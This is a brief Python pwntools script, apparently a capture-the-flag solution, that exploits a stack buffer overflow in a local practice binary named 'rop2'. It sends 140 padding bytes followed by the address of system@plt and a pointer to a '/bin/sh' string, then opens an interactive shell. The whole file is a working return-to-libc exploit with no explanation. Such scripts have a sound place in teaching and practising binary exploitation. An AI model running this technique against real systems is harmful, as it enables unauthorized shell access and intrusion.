#coding:utf-8
from pwn import *

system_plt=0x080483A0 
binsh=0x08048610
ret=0
ov=b"A"*140
pay=ov+p32(system_plt)+p32(ret)+p32(binsh)
p=process("./rop2")

p.sendline(pay)
p.interactive()
